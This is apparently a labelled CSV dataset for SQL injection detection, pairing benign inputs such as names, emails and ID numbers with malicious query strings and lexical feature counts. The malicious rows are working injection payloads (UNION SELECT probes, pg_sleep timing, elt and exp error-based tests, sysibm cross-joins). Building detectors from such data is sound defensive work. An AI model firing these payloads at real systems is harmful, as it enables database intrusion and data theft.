Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"-3649"")) as eydu where 3220=3220 or elt(8705=1510,1510)--",1,as eydu where or elt,57,5,0,1,3,1,6,1,3,16,3,1
"regimiento, 114,",0,regimiento,16,1,0,0,2,0,1,0,0,10,0,0
1') and (3020=3020)*6703 and ('botl' like 'botl,1,and and botl like botl,47,5,4,0,1,0,6,2,1,18,3,0
p2,0,p2,2,1,0,0,0,0,0,0,0,1,0,0
0142424343188697,0,,16,0,0,0,0,0,0,0,0,0,0,0
"-8414%"") union all select 2795#",1,union all select,31,3,0,1,2,1,4,0,1,14,3,0
miramon@logiteclines.rs,0,miramon logiteclines rs,23,3,0,0,2,0,0,0,0,21,0,0
"1%"" or 4240=(select 4240 from pg_sleep(5))--",1,or select from pg_sleep,44,4,0,1,3,1,5,1,2,19,3,1
tuamea@wave.com.by,0,tuamea wave com by,18,4,0,0,3,0,0,0,0,15,1,0
operalo@canovash.vg,0,operalo canovash vg,19,3,0,0,2,0,0,0,0,17,0,0
18726543n,0,18726543n,9,1,0,0,0,0,0,0,0,1,0,0
t1iesti70,0,t1iesti70,9,1,0,0,0,0,0,0,0,6,0,0
"1'||(select 'svgd' from dual where 5188=5188 union all select null,null,null,null,null#",1,select svgd from dual where union all select null null null null null,87,13,3,0,8,1,9,0,0,57,11,0
"calle andavias s/n,",0,calle andavias,19,2,0,0,1,0,2,0,1,15,0,0
00903443a,0,00903443a,9,1,0,0,0,0,0,0,0,1,0,0
4234394543607287,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1')) as ylyq where 2953=2953 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,as ylyq where and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,181,28,1,0,8,1,23,1,3,120,12,1
godofredo,0,godofredo,9,1,0,0,0,0,0,0,0,9,0,0
"1',(select 9100=('qqpjq'||(select case 9100 when 9100 then 1 else 0 end from rdb$database)||'qzvzq'))",1,select qqpjq select case when then else end from rdb database qzvzq,101,12,5,0,7,0,12,0,0,56,8,1
yoe,0,yoe,3,1,0,0,0,0,0,0,0,3,0,0
"1) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",1,and exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78,105,11,0,0,6,0,7,1,1,44,5,3
fresia,0,fresia,6,1,0,0,0,0,0,0,0,6,0,0
al769i4,0,al769i4,7,1,0,0,0,0,0,0,0,3,0,0
"diogenes 82,",0,diogenes,12,1,0,0,1,0,1,0,0,8,0,0
"1 where 5925=5925 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,where and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,120,17,0,0,7,1,13,1,3,77,7,1
0614375180233873,0,,16,0,0,0,0,0,0,0,0,0,0,0
kiam,0,kiam,4,1,0,0,0,0,0,0,0,4,0,0
collinson_butarinski@fernandosoto.il,0,collinson_butarinski fernandosoto il,36,3,0,0,3,0,0,0,0,33,0,0
puntallana,0,puntallana,10,1,0,0,0,0,0,0,0,10,0,0
-4351') or 6525=9458,1,or,20,1,1,0,1,0,2,1,1,2,0,0
paulet ajau,0,paulet ajau,11,2,0,0,0,0,1,0,0,10,0,0
81383348x,0,81383348x,9,1,0,0,0,0,0,0,0,1,0,0
sarteneja,0,sarteneja,9,1,0,0,0,0,0,0,0,9,0,0
"-3737%"" union all select 4452,4452,4452#",1,union all select,40,3,0,1,4,1,4,0,1,14,3,0
undus de lerda,0,undus de lerda,14,3,0,0,0,0,2,0,0,12,0,0
6596687598913643,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1' where 1673=1673 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",1,where and convert int select char char char char char select case when then char else char end char char char char char,216,23,1,0,4,1,13,1,12,97,9,12
"1)));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((4537=4537",1,select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3 and,111,16,0,0,7,0,11,1,1,72,6,1
"-8094) or elt(1032=1032,3623) and (4569=4569",1,or elt and,44,3,0,0,3,0,4,2,1,8,2,1
"1' where 9420=9420 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",1,where and select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,121,17,1,0,7,1,13,1,3,77,7,1
"1%"" union all select null,null,null,null,null,null,null,null,null,null--",1,union all select null null null null null null null null null null,72,13,0,1,10,1,4,0,2,54,13,0
